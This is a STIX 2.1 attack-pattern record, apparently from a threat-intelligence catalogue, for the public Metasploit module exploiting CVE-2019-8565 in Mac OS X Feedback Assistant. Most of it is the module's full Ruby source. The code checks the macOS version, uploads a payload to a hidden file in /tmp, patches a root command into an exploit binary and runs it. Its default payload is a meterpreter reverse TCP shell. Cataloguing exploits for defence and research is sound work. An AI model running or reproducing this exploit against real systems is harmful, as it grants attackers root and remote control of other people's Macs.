{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--039c634a-0501-452a-b9be-a3ed472948b4",
    "created": "2024-08-14T16:34:37.275488Z",
    "modified": "2024-08-14T16:34:37.275492Z",
    "name": "Mac OS X Feedback Assistant Race Condition",
    "description": " This module exploits a race condition vulnerability in Mac's Feedback Assistant. A successful attempt would result in remote code execution under the context of root.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/feedback_assistant_root.rb",
            "external_id": "feedback_assistant_root.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-8565"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/0xcc/rootpipe-reborn-part-ii-e5a1ffff6afe"
        },
        {
            "source_name": "reference",
            "url": "https://support.apple.com/en-in/HT209600"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ChiChou/sploits"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Mac OS X Feedback Assistant Race Condition',\n      'Description'   => %q{\n        This module exploits a race condition vulnerability in Mac's Feedback Assistant.\n        A successful attempt would result in remote code execution under the context of\n        root.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [\n          'CodeColorist', # Discovery and exploit\n          'timwr',        # Metasploit module\n      ],\n      'References'     => [\n          ['CVE', '2019-8565'],\n          ['URL', 'https://medium.com/0xcc/rootpipe-reborn-part-ii-e5a1ffff6afe'],\n          ['URL', 'https://support.apple.com/en-in/HT209600'],\n          ['URL', 'https://github.com/ChiChou/sploits'],\n      ],\n      'SessionTypes'   => [ 'meterpreter', 'shell' ],\n      'Platform'       => [ 'osx', 'python', 'unix' ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' },\n      'Targets'        => [\n          [ 'Mac OS X x64 (Native Payload)', { 'Arch' => ARCH_X64, 'Platform' => [ 'osx' ] } ],\n          [ 'Python payload',                { 'Arch' => ARCH_PYTHON, 'Platform' => [ 'python' ] } ],\n          [ 'Command payload',               { 'Arch' => ARCH_CMD, 'Platform' => [ 'unix' ] } ],\n      ],\n      'DisclosureDate' => '2019-04-13'))\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def upload_executable_file(filepath, filedata)\n    print_status(\"Uploading file: '#{filepath}'\")\n    write_file(filepath, filedata)\n    chmod(filepath)\n    register_file_for_cleanup(filepath)\n  end\n\n  def check\n    version = get_system_version\n\n    return CheckCode::Unknown('Could not retrieve OSX version') if version.blank?\n\n    version = Rex::Version.new(version)\n\n    if version >= Rex::Version.new('10.14.4')\n      return CheckCode::Safe(\"OSX version #{version} is not vulnerable.\")\n    end\n\n    CheckCode::Appears(\"OSX version #{version} appears vulnerable.\")\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    case target['Arch']\n    when ARCH_X64\n      payload_file = \"#{datastore['WritableDir']}/.#{Rex::Text::rand_text_alpha_lower(6..12)}\"\n      binary_payload = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n      upload_executable_file(payload_file, binary_payload)\n      root_cmd = payload_file\n    when ARCH_PYTHON\n      root_cmd = \"echo \\\"#{payload.encoded}\\\" | python\"\n    else\n      root_cmd = payload.encoded\n    end\n    root_cmd = root_cmd + \" & \\0\"\n    if root_cmd.length > 1024\n      fail_with Failure::PayloadFailed, \"Payload size (#{root_cmd.length}) exceeds space in payload placeholder\"\n    end\n\n    exploit_data = File.binread(File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2019-8565\", \"exploit\" ))\n    placeholder_index = exploit_data.index('ROOT_PAYLOAD_PLACEHOLDER')\n    exploit_data[placeholder_index, root_cmd.length] = root_cmd\n\n    exploit_file = \"#{datastore['WritableDir']}/.#{Rex::Text::rand_text_alpha_lower(6..12)}\"\n    upload_executable_file(exploit_file, exploit_data)\n\n    print_status(\"Executing exploit '#{exploit_file}'\")\n    result = cmd_exec(exploit_file)\n    print_status(\"Exploit result:\\n#{result}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-13",
    "x_mitre_platforms": [
        "[ 'osx', 'python', 'unix' ]"
    ]
}